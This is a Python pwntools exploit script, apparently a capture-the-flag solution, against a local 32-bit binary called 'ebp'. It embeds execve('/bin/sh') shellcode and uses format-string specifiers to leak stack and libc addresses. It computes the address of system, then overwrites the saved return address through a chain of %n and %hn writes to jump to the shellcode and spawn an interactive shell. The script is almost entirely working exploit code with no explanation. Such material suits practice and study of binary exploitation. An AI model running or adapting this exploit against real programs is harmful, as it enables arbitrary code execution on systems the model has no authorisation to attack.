#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'

sc = '\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x51\x52\x55\x89\xe5\x0f\x34\x31\xc0\x31\xdb\xfe\xc0\x51\x52\x55\x89\xe5\x0f\x34'
p = process('./ebp')
libc = ELF('./libc.so.6')

__libc_start_main_got = 0x0804a01c
# puts_got = 0x0804a014  # failed
sh = 0x8048296
buf = 0x804a080

# gdb.attach(p, 'b *0x804856f') #fgets

def leak(n):
	p.sendline('%'+str(n)+'$p')
	addr = int(p.recvline(),16)
	p.recvline()
	return addr

def mod_ebp4l(addr):
	payload = sc + '%%%dc'%((addr & 0xffff) - len(sc)) + '%4$hn'
	p.sendline(payload)

def mod_ebp4(addr):
	payload = '%%%dc'%(addr) + '%4$n'
	p.sendline(payload)

def mod_ebp12(value):
	payload = sc + '%%%dc'%(value - len(sc)) + '%12$n'
	p.sendline(payload)

def mod_ebp12l(value):
	payload = '%%%dc'%(value) + '%12$hn'
	p.sendline(payload)

def set_heap(addr, value):
	mod_ebp4(addr+2)
	p.recv()
	mod_ebp12l(value >> 16)
	p.recv()
	mod_ebp4(addr)
	p.recv()
	mod_ebp12l(value & 0xffff)
	p.recv()

def set_stack(addr, value):
	mod_ebp4l(addr)
	p.recv()
	mod_ebp12(value)

echo_ebp = leak(4)
log.success('echo_ebp = ' + hex(echo_ebp))

resp_ebp = leak(12)
log.success('resp_ebp = ' + hex(resp_ebp))

__libc_start_main = leak(21)-243
log.success('__libc_start_main = ' + hex(__libc_start_main))

system = __libc_start_main - libc.symbols['__libc_start_main'] + libc.symbols['system']
log.success('system = ' + hex(system))

# set_heap(__libc_start_main_got, 0x0804852C)

# p4r = 0x080485dc # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# leave_ret = 0x08048468 # leave ; ret
# ret_main = echo_ebp + 4
ret_addr = echo_ebp - 28
# arg_addr = echo_ebp - 24
# new_ret_addr = ret_addr + 0x20
# call_start_main = 0x08048417

# set_stack(arg_addr, sh) 
# set_stack(new_ret_addr, call_start_main)

raw_input('ggg')

set_stack(ret_addr, buf)

# set_stack(ret_main, leave_ret)
p.interactive()

 
